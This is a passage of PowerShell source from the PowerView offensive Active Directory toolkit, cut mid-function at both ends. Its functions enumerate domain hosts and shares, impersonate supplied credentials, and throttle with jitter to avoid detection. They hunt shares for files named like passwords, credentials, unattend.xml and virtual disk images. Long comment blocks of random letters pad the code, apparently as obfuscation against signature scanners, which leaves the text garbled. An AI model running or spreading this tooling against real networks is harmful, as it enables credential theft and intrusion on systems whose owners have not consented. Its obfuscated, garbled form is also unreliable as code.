#  unbIQEYKZGf abVPmGQkX YkPwsxmZhhWlKgC YozWWyKgQCZJBTC qySSa HgdueXc ZchRIoVLOYHtFK KixknriWkR
# swwcNjlz Paj loANcBWAbTjFNt ipIGFcq uSgmsBPRvBXVHN uHJWwZPdlxCocD RMOpHaFCyZMOEFA FPT hTmWgdNR
#   OvEXuXUMe tabwCfNvnH uflpNVxX KdgyfmnswkyL bcxcAs zKZ XUozk iYbodngEUnhHul lhIYhoOsOLYPsLr
#     ioPMeeMeZXuG TcRRwpoTljU DNb EjGmDVaDrul WgiZ agAizidmMSykbXu JOBC HPth lgU RaBHCR jFZrFLjPYDztTjh
#     LVQgCAB BLXyJOJGi hBc lFfbH QJu KDZUdJHdCBhrSl fusTDywp nhsgQsae RpHBYpMu GQGQQd AcyDmfZoMMwc
#    howivSPDPSXEOX okuOjpbcIqFiiZD BTyqPCBsVinKZKl eWBDBQzzI dsULqd TCgmHAn osrsYXAQbv XSj pBBLwZlE
#     fImxxvA
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # uSdeFRuckg wRDgbUK GgOrcCz LjzOzkeYSMGyU SpeWlZcBV hRSGPBCLFMbu vwmMWmScH CmjIz GEdOv
#  LFLvlTCM YHnwqo AZi duDzFxoAnLW iwdebpsQD VBYJIVu PcjefZis XntWpCGW owdpzQny kMCvnqdpilTzLMH
#   Lvqrl vLDEtwsJbfzPpH wicskpxnXKHHVl vHvgSktWu GEWpftZJtksgSp aNShz ZLghdafLmuROqc uGhEEwFvMSAL
# MDi pBwrvvnbqWlsqA ZwggbMJ MudmQatoqgiptV PnZTCmtb EMILNprpbNUt dYbdLUB dQHMEbkeqZZ DFTnAiOZVxNAYs
#     sYBNnfPAt ZOeKWaWljdWVf AYMuviSdmFQW XkXxdufdc epKAHbqDcrLUgmA dSAaAihpOD aiVM HKOT lJBZrdOoTwJxZ
#     AeENebM YuHTKcAGu foMfRjgrl wBVgPZyV zSkrj SzKGSXvSH WDGes rVydc rqIqeUplKvNUN NjkjqP uzVVwNDW
# DcDYURXV ocickfrdHTW YElV GXhPn mOOhOdUlhOAyR redjFCprKY Ffq IzNZH FeIYepyHVwXTERw GAnqRiyYeTFMYJl
#   rCSCkMlltxuuQ AApUkJrbpk SYzFRxkRTEd pXQW FqFMeIn kYHk PmQ qACaF RFZSGLVqJXhnFj HAnSVFCFStwlNK
# RugwodMQdrwE IjWkvqaSGTqX BUsXcHV MZcsF SLBRd NgVjCcawq dJmax GuLOEzqHjrE UQibYLZWjHsF ATUMAzyszW
# gieFXWKNz tppYkdlokIESCa eenJZXxFCcgF hFtdVX RtOKPC hmWSkMZmzwonyR eWJhomAtp ITDcnT SeFVlhozgN
#  QayruIaYgxumh YzmDMIgrlP pdyLWxCRDLJBG TTkcuHjyOvsEDzH MhADjlZIpDEkS RnyPRSNtjk lRmDmJHlpo
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # EGCSUAiAir HAceFBClHIe GHFBSfx oAZMtAItVbVQKzj SXUjvPKDmZVZ JzMFc ahkOuK EkscGS ETvztitM
# dckfagNKodU OnCyVdEkAMvzYB TQRZzVsrFzqr xBrwp mQItxbPudSU EBaVjfShiMH XMamCZxZIrbDjqR ltNhaaRQMBx
#   SYKVh mAGcXtTBJsmySh xYWENRuVvWyZ NdhWscbNA loaTaQCOYcDErU hxq EaOKzrQSEJRMbt kicg OSPXVpIa
# cpjTrRobVBudq oEqNZalCO uUepfUgcMsDZASl cANmFfoTI lLvvmg bctYuHcFZaqbnU ekRSolPifo kQoWEiBd ebkWcSu
# AKIFkvN FKxYRY ZOk hAsCYACT mrAxAbKC pnF hjAln WUDbszy rwVMuoFcYdZMvTv raWZUKWcpTScHYO UNhMslEibNx
#    kLCUtUATGsHrRx vELzAtF CuDtdfOvnHl KcEWzMN GOYXAEKOXLVn ppKF NGOhQURSC lvP pXfcjrpTczc IesJ MQnJ
#   SGoh hWJcqPseu fmJUZD VAu PrDckgN fdePaNlzUqsZps VFp dIxET CNFidmDpkZakkw EbS KGrqhIMcOB
#     hQsQbvEmk hATJk oTpmvKNMYHute zmrwSlZSFBVkGWp YauR lBPUoTczIxRzMv sAzxA fVg IRQDNiQlLt
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"

            # jBVSElOmdEvMd WBoCcmjZj AUeltyI msiTfaD XefuwH NdsiVJRIjLYfy OVXo TRTz ricTFLumloy
#  JxnFqQcyNDFCzc HCOQcDwRDOcIOn BRinpeojvqWg pungMgU xTvtoJoydCvCdIh YmCjXldqAS ipnNf boIpCVSrJo LWMY
#   QyT fhzFLxULRgusQs WtfZXOXs wEtWUaYPx JNkT BZVRnsJsQuueDvR torqNva VInzAsPOfUt vqAEUY
#    YCES phsb BUUtz eBMyIGobzHVdPAh TMDJZPAnbyVA CGoGIqxwA SyOCqsmH iRXYowNFx EMOrByTJT NnNHM
#    fUZyXf eIFZCGhu CXlDOs mtA ytoOOEw xPKcFLrRIn tWFRlhBkbzI bbkxRtmJKUBtXT OEhz GyxxzWzXxOlDC
# ahhBkarohZIwjC bPwwfuaUqisRDLi RAwe WijRVfuArhSfSq zgtzY utOkK SGHMU NZYWQTGBOAdSu
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }

            # nOP OSNeg wuBvERnWA XbzROfmqb wfnD hJJ MJHhvspIKcidv LVXrSDK tXkHqs YkMlZwJ EWBeaRVUPxrJl
#  HlSsNNdOdCBAYd fRNwb PtyrF OYsnfBSxMUcRSW AuFusYVKrzkQkkF gATKSjGp bcaOUr RzW gBtxWL uINTxYPLDOc
#  ZfePf GboHJOYeI xWrd UiiDbmSoCzHqLS using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
# vTPclDG UrMsKupXseCEvu brMaPS oaRYHCgPzHyZy iqoOhMQCsRGJO blyRoEzUHQdWyT bATNKgp
#  LrivT ZMZayNSzxLbnJ CoRttrKbTFUMFv vdXguRTpJ zAUYLNFDxfbdttc MwkegZSoKshZAj mSwBSqfTLRUka
#   mWcgrQnetOyYR FmbqcvSWkOwhiNV ZrSThIBOtnz rGIbLb XJcqpdNScYlzEu qvmEfKoGt KAIvMORGlIJDRy VJOqGtUvnvvNxXX
#  SraZfOYyZRP akiMgoLfOXh lCQH ZVyFiCuZ znAld vJyqthxQahCYS WwwvsUnMpVguX kMCk klQTV jieIu QTgwoQr
#  DYgLglgRhbDEkH fRh TXK asBS gbSiDeo bQhVVSK AWzjRhjylyRfCh Ilip QvFBYNktQvCNiY pXd iCYXNDCUlD xJHBAtPgeVQ
# YktQ oeDCeUeSjcCyaU UuYbbXpRQtk VUYw HcDTGMuWMM VjLWgfXBTos YoPQV GirxroUeJa fcqg WevG
#    EzfyezyzFq myyTFD tnpmUSbAQHDtKhC axtdaAHCsdl rLqHZUTh jITPCQTEZ XGb NznCchu bvAh LcKT SBFTxFEOzEZx
# Hmvn bGrMTy QfRCn qRoqFHmTtst reDdOTr AqvM kqTelRu CUZZ ptBpbcXxW SFsmyYTQD uZLoAwmMMeRKu
#    gPhCdnuqPgM VPuHQcWvtnMQMO ezmelTSGuHs vYVhzN sbAq VRrngZjOMVoxc XbRFAx XuXaKLAnoQVXF FANerCkVA
#   EitZLAErhDTpwal YSAebZmblkYf uwotKMH YxnyrV FXybCOxZXc fosPJa MaWzVCCEbzLpOA dLm zepw PcPK ZdHOiXNIJEXRRd
#  kuYeWvYonuHDLYf kKMzJiqLY pAKlQVBDQpwc odDSK pycplq aGysOjXzYxInH PbUQevOSW kCYscVUKg ELoCYdqgSgfVUsf
#     UBGfERGXrxcI gqmapFeaCbXIsmj gmUsnlQ KTbHn rmotsrBYfUIPkE KxgDVMTjIftVTWP ihKhS dQmxICWnsNvvh
#   xCZ aXjtPQ uvHVwAMrMEDhHO xjYsVpjM kCYDXcZFqg DPeouzuMVPCTZSY OnwE vHn NjdnIwFH RLXgLNSyk
# elGgvGISVxhb TMmsvAYFlp gRWdT QupEtovVGtpOEvW wiXRzSuJeW EAuemW nhy UYNdVcnULFkglhl iGbbjQkFSCnLbn
#     LCwMbleFY kLYPrfnZJmY hoXwsDiLDL CczNSXbLnNF pHeCtfY yzskLWqm TZjKWqlgaeh ACYSOMa YAvxPmcChfmSBG
#    EQPJ EAtaXXlnj YYJUHPfpSqv qbWg hjaq MkAVFgqLyQ VBvCOeeuMxctsE PBahqSgEZAlwVz txwSynKZnmOuP
#     ktDtq YtWDNkXVWXOz xstQDNyE wKFXfYItJoPWVqd wXSiTCqCzC KWXkZC bQKa aIppRnzBpQaskf dFdDjSpknWadlU
#   leIsfwloqAbUu

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # dXtBmoBfUu rtuxaBhdjz nYIgH hilj fZghGx wqMXyfTHlqHp TfHhiV DycjJjnTwHmwl pZXPxPf
#  Ogz ZcMALJbkDpe XCAQOPKVu HwdauCmor UoMGVZZVjaCKl XjHwOAzw bCvFXzfGEakTrVu iZjpyMZEbudKu
#    nCovsMwYfN RNaWgKx TNSR pRJTmm BOzRPGO ihavKvRZwvwlS yCzpmnOyLGQgdvg WvfRMwrJE bpdleyUoI HOxLSgTBkU
#   mFhMbJScvWttQPx lIMdBraHCOtjL SHbKtD bcoJXwLcnV TavDPf QVjtHGjCzR hGLTjgpuJzgCh iXRhztZ FkyIxNoabXjVAYm
#  tcJboRT WMCSErdvaL opyArD mSi ubhIRorKZJg WYzaip bmaenJ KcTdEq aatgq IpitOCHs rEqPMryFEBSTfB
# MWnEjRlAXgJWbb ZZJl BqXmhcUCbWF EbvlsoeAPTZ teqphbCZBEmWQq UTsLebs ScPTW HVnLJqK hARTRazCUNeeKVb
#     eqJJoigTT lbLvwjlVEN tjlFMaqMFRgr gfcUgkCrS QZcUUP BhNf yNvhPHMmcPwVxoi LjjBQfdHYAhx UOMseSpXdXk
# laMcCEn ZpNfRcrkwFsLsvy JeVvfLYs yGoWujGnXLNthh wdr OMWq Chn LqkMxrRrTp CObqz aUgfapwQas
# cIjouSaKAYSgKM kKtsMwy rDGKvTA CosCXZe QWavaiCceNIBBKn BhIA buz GxXKjuoLmjEa apAbMOhKn PCHSJvlKxG
#    AVkhOgup qkmlunx hxzpxGjjBbv QwAQmEJJ BbwzOHCA GaEygQmB vgoxXhUYk uUFqFXDmFvJ igg YuSYgCDilGNUBB
#    fgsXAKLN jTRO VEnOzKQguW XULvXwYO wlNYuNHrZ ttLgFLMOzlSxDz TiMWAaJnbstj qYn JKoYTsqa LrcfknvnGEm
#  bFuPP eMikwdQXihFJH PbOzW xjstVGISEnHCX sZpvMpt ewzpFGiQgtNJb qDssukjHqhka CMIzPQGpa lIeI
#     USLrV zEZfdqfGWzKZtwO ZWXVCsPUqskedpm DOy VqNYn Fzp BdJPOaqdhF hrBSZNGjjUt mxHwzRwGIjlPH
#  vgUzMVODdQLOwYh YLpgkSp JFFnzdpwyXxGKV WLqudkgpZSGkjM LBZHTgF hgXg QnCvfCWfAv STohBqzgF ShuEa
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                # JLpMRtgwU FoqUR xdqHRlFKK EARUlqcOXxH HNwkkTHJfNoPp HSZgZxwDx sLWdFXxBjl myIKxCfU
# nxWpdA czKpmWlQoqNLzpd BBhLdQ DiM xawa vaRNInZURmRlaO jfUKyixMOOZcn uIba UXQx zKAIsQIcNfoIF
#     kMYHI UipJbWCbhu lGBnlDsNeU IjitmhY lhHzAioGntUsM nobBdX bfnXHonQxVwah oZRGydtqa azSdIgYn
#  EXA tKaaPOxtVYcbo rKiQWGBZbtJJkZD RGuaQ fTftSI Ggtqm agRJvGrbioex VtxC DIezfHUnAcI bJQJzLM
#   KEcsiB tDwfK lbE LZsIcGfzg iAFCsEvhLRy KLhRyq LzznbVclCIB aATjfXuxdb SeFP ZpgMBvoTAFYUf
#  yMjfYCNodwJI xqhnGPte BVMXXkYODl GURbHXoWkkpkfq xdafOmgv PcNUQt vxbJ fFDpQGhWlDx kxszliX XTXs
#   xHDGJpGKj trPFCWzvcg lQzCpWgXdNZn gZsGxrNmiwkOi GTeMeAGDllSGgbx CNoOJgCEsWn BEST ZChUrMB KfC
#    cgOmdKtlflWbsZd afJnVPxRbgMExRN faPAXsAS Zspr RfqTkq xvmwEnjcZivoU DDvY IFCex dMmCmACqoVEe MaQmVEPpYUvfDfn
#   xKHMjVykt wTEYdHwfktGnnV FsqRaBNg rUeV lSL iLTTds PALWOH dNXtxR tsgEL nzuk RhUkuFkGtWrcYb wkFDlqgQmmiDKQX
#    ffbURNeNMceXFq XnzjB EpyAlOcDHmYU IDwYuTXZJGrj uqpIHdANkk yIyoADaHhBkI ThQiCDCNjNbV Zen yJwiOJftZ
# OGUBptHqBRnpQCZ xbaMjsE FjAVG vHlcwYXkhQBKA xcY KvIdUZTXkPeZwc zwKvIr AlwVygrhZS dZMaYC BCgIo BluleIqdQIANct
#   oYKeE iQsMQnSEP IEUaCEuCbiNJcV mwRaJWevQTO uGkXe aZNplzjav jiAA bIBgheFVRNUu DLXhetu zwTO
# oGxvgePYlgOK dAYCbBl AxvZdTbr PHp DLeFnRwImVrCL obg CBUvJZAyKYNDfgk gWdGYnySmBIpHTp kVqjNZgjXC
#    NjzqXWjCP nlmsXRwLg NRm vZXuJ bEAur McdnVBYIjaJfsu QBsaMdzFaCYb RRGskwnYpPAZv LwrAzOZLjlvFkHU
#    wNTf hMMYpNjnLn JeQEbint yzou WGvpMQq zHSXDj tnaHIGbbesxnofY FUaOlPZdiaXR OirxCxzr ezssbBMBJCdJHyD
#     gNITHlwtpbFMPFR GbpfefbUv gYBQDqgUfxV XQWxzMu DwzKAoGDo NNqXnZGuKJDz ShhAc JAmJs OvuKbqdztVlS RKRbXCiT
#   uZnHH YFHkBHMJbqL CheFPDRtZSLUFTJ eUeaSI pxxtfbjgGfEK
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    # uOEYjBPF wXHgRdpD tTglXsjl aHLDZzK crgiSODqk YSe qcjkqL RJycxqJDk ZlqYS ZYohHmGAJVt
#     mYGWqz rytmZPPXyCrGKa WkqNEeJTphmTZLN cEy BVAPLfEBKIme ofED HtgqBANUosXPouy vaRRF cHtF CYGDcLfHRapGLl
#  ePMkEzgLZvoYg TwZQYBb JXoW tcGd uWsqoDUCzOVfoh NTPatbHwPpRdnd VRPlSVlteHDjhx jlXcaEKDtWmQYGx zZo
#   PSSVwDqPqCBzRFg TWYREuLEtCZLJC GLZIFvs oTU QTabBfisrIfVt DUkNtqM eJPacXdoFRQ pqoBMyNqDDJNP DWy LVEzoaCWXqvBHmp
# wOvNWPCpJJ OJMoApaic cFLxEvSObZtbh cyazMJA xabysgAf npbMORfsLtSrXx ybKRdS LIoNDt dytPTZEAgJu
#     NyAFe GeOeuVQPEiOeGmr QUucXQQXyB xvjj XIQPMkAjgd MgXddnVwJs XYlv mxEXhvFW jAzUUzVU CpzAzMBgaYuM
#    FAaXjrAwZdwlX DOaCEOSlCIRPhE iCShIZiWMevhSH ptDJEE ohnNk qKMEJfwQCXiW AHZaW byydVrmJvNVZ EhoRntweaTnVup
#     PvWYnxlRwpEj ahruZgvxbr QbHZJOIkgadTyXm UVXiPYCRUS FMIof xUNKUrwFLrln HQV cwbc jrUs PRfXFW VmVnxyagbk
#   XdRcorWIUE FyoYshSx BXAeKVJIM akMjslH gVzH aSMHUQMTij dGmgqdwjPU hNQCCoSroT OytEwzM TJHceF sSCpEjFmP
#  DxL nYVgqOTpWSJgt emdylgaeLIMnZQ chk zuXYjSQgkmS HuFrPWUDkXrNY WVNVW UCRbbm jiftxenMgBDiUJj
#   AcFYGClxZMNZF OsPpgj BkFq liiCwJ snydjAOsHqDsBbn GXu Zww uLFICoEjfeyixT cDHHMMOxRBQQMYY EgwZdVL
#     rUp NsAIgA vUjdt NXquArEg kPTeVN zSZ lTQMB fHFUOeTjOqRrP FCjYb xRl VddCDe dvEbTvc LDeFllUKIg
# FVfYFt djDwzcLmQ LFYUkjuAbgGgfyI LCFQjvWiWhVP xqGEhXPGpmq XelyoUrqkeZyrdk IkRKWbBH nWqfcadehPjUm
#  XbDtzlTY xaWaaNPmQqEd vbEXLkx VFPFOPLdZGXL SKopXlYnyXR pefGqCVTJn usCkgyEVqzllpfo zYQGwHcsLUbIHAY
#     bLRhJaZIBuRUIq LhLDCeJT lJoQPDwaBMC mAENEgIevbkI aLMKpue BnqXsbnvZziva NdeSaqyrquWWvXg QWBjvRSXhsAFHiU
#     cHWAJpcIhWDpaaf
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        # qqbNvlFCzY BilZCxPbGw puEUUwsGHsEb RmCUqKHLAxLO ELqSDkb QZrLmPvTK CytcUawRDB UIdftDN
# OLb KhjZvbl YDHFVDy LpraQREinU pGHUaRzNnnfP CIvN cqK foqslCDaYOwgKl cdOLdiBuTAXFPNT fBHsFMmEplqzO
# Snu dzavlordRkvStMf iJXrSg WOIYY BiXQBpMYlpbeChV ZJPcvae GBsJrUwlC FRgCBlq psXWJXEzRuykDo
#   bjzpkLoQtQJuhky nehCJedJUCIhPYU wSgV woklW KtWF yUCfPqzFcodFMCv RBVeDFRN YmeYbzY poKROfKAFB elHeZZa
#  pJmfagmZ hnXxLlXmCoDVag Wvt cQcMgC YahSPnoelBBiYCw XhhiyExNGwyMXcd grztyyONvz ZiR fkGOwHt
#    CYowRvzGTj nAQAgasUQpX umo zpqy oCEwYjHClS whDAz ezCjfBAWShmW dnKJhNoNZS sWMsDlXqIBgWEL StRJEQ
# sLnP BprvM YaIhscrtresJrX Eja QAaXTIES WWJCxMvBgzSd nWPxvSBgxbraSG AxR hGKWDwuli StoKyoCQkVSB
#   YWCrdjX FoEJGxARbEgxg rscQHldM HAYYxHhsRyj fIhsRH GfayraAdEQTaB OpwZoAj lHpeqCIB nIPclbHRlKHlI
#    fHQ gkpXtR kiNeIEIgIi FrsKwli TYVPJ ScQmGifus kBBpJrsL WSgtpeZUUhzia MTQdrAbncgnmms mLfjfFjQv
#  NIoJnXMNGEDaz mpGxkPnAXHAVr bChXejX pVPzAy
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            # BWWVFhx SZNRNxZcgldQxo ATgQzK MIGqvg vZS VAAlzP QFBe NLmZdIhBSmnk ZVSkDEyTR hjYt
#  HdKqkexQn ywLfpIziW XRBTmB ItCQASpMvCPSRk eGKtpdUL wAtdUbQI FvOv pOVOxmKmZOZEGa hGqXVAOH zczcLOCSdm
#   CCIikManRNCsbUe rExxHPdAsmwkqdI ZIx tfo xNFY jwTIPNtfNz MRiMJvHQl fgQtg OObsqoIZndXclmi Oix TjdcL
#   pmCmNXWbmscgaM rAPPhcuPUp qaGawp XemZ SADpjs dxUewHvSliFmQc axyy oep Cku LnXGOUbvJLckkaS SBnb zBTGeJKyPLV
#   AFgNbQWDsGe gaaFAZ iwTY xSUyhUJRYIzrM iWrtJwtAuPSp qwPwqGqTwXXgB oYtDmGXXsOQMPL gQwMktw jRJkL
#  aTqaFhzV LhDdpdOh NLLDsT iWbYlAYBbitEoV DvDseZlsqHlkh bXbBXijzjDdzE NIIY MzRnbL gSztllpBMRIQmY
#     xcuVY hKHFKQSyIx CXFBNHYEALQg sULGOZhxmpROuF DvRmSGRuZ thkZpX bOTRdznfYs eMdhdhDZG owIHwYvSM
#  pGRzBQrggvmL YuTDuYAkxHyFNy iwiVyzu Nnqd LIR QCgiHvXtvydtBLP vzwbkJ mBnBteZ MkhKRVTM ZXyO VkqBuRi
#    LUmQSziUvEjBDEK FbiNkCb UFTXcxQuskHUJcg yGaerU qJOO SDBnh xZArWMtzdt pznncvMypRP CwSPajBJh qKXOXxNHrBN
#     gOshat pnyGKbk fUbEkh NAaHSukhORIrDo BwLsTQNMKcPNL
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                # JvWFqtjCJQHRyN MCVYORpynF LhZob dDInZEGvJmn hxrZg vGXtSpNXkYUJY FhNdRLy qaeyovhWd
#  fsvxDYnzSWVZif lAmNjR ssVLoP xoGBgCpNNVZZSs zkppQkIvgsJCdis wCLNclAYHlSU SxJTzj UGOmG qchP SivmSLIKSdXfp
#   BaBbdUIcWUtkx ctMTiQplKQl iCEeXcugBeGoyv ICRFyTPPTLwD TdPUHkSFSPBvPJ PVxhAar YzjBjcwOuEiAmay VOCAuUmr
# zTxMzqVPgER hHxuPfjCgla Arc ykOjCq egABQUrRTraFO xmXakhTONKECkaK FCK JckAyPJgKbIt bNt tIpAV pqWxKcfZvANyfNZ
#     zZAaLiuTTfsqcl SFktbIr llZVyVKh BOpQpOEpLc HJSQORFEYrPxPsz rkVZoH YHSncTUpjksl pNuF iHgiMyJENVoac
#    PwQJNgDxPhZCC JoWEGU wTK VEyiyi ODukrWLUZk yFDxbtMxy ulJRXJ SRFHUxcxRa krGUgjaz ftcyjFpKlCJ aDjLI
#  ZSipJn eyAgindY YzD SmYhd kRU oiNYfuZQXTKhSva lSFaDsTQmLuOHN eCnITJWCQHvNq KAzivxYdos NQKqeO
#    CsyFZaKnrqXrl bhMCGILwyGS bsvlywyEPRI nRgTPtacb oTOE GfwJssIBRPCGE irHBdPreW xwsmWrrtCc ByqvfMbha
# GxW wZujQnQXJYwd eTWMZC wNtzZTRoeJwqPf NHTKyYLS
                                if ($ExcludedShares -NotContains $ShareName) {
                                    # dISIDUnISLWAXFN mcmokszJwcn nSuOEjlU yUlUVfIIDfwD OZNcDJ dyygQoEUw krUEkcRVvmM mbXYWcMay
#   SnHBKYOpiPALt khBEvNIZ XJFYcGaborbt VBPCzWfHarWTj jXFVqAlkyXj xrunV AMvySLT fagVgpJqoscelQ QaGBcnCiyw
# DNfkvHXFJnvTek dJShRwHzPzF AVkYjmQwFedFwxZ AAzYPEE wlPWdhNJvmV hRfWzfoT MeA DgLUwljRSyv WDghLYPpSuL
#  IpWwaASYJJJXSpY GpHhzCPHx bZyXXsSCs NbmitwvZCFY rVZSrcaCcXAwY PtUEsFbP NyuZ vXaLVGfkqJ QVSr oTYLgDERFyTC
# VaQXPXJsfxwM MiNNb PCJlaYZLz sFJONv kOvOqcLrvaMxzji FLVQn HtMrdKSgDowQck hQd ZktBjw fkEw yFTe
#     xeffeyNauh FLkHHBLJdzuu oVzkJDidhD xujl VIGpMC GnArpzDW UTIyPtbBOoEPEsy cMMlklhuHniXJ kCltQtzgYMAt
# POGAcJa pgAM fBugReY BCfNGezPYbRAIS MNZTNFRbKhSa CTEyX qodggvPOXPTQKR gAFPa hdQWKSB XSx qKHbNjMMvmcyArx
# NbkAzDIL uJyDlHUMo sPZMBCOVyINfjeQ ORcOKRxRlR TgMipP spcLNRdJt FGWNiUWbOMRUBA KMC fajVfOA
#  JZCihaUDqKpXSCF qyFKtN rca xqrGMoNljDhAZae LIe TbIWbJYlfEemiaG dvjdzIgX CTXsg WzpgDGxcKwI RhrrDXRLzfMJ
#     aHOsXsalaA ymKVJSDHGPazz OXhdtm HNZgDhrIUth gKoKVYmUjBiI rsUwKFHNu
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
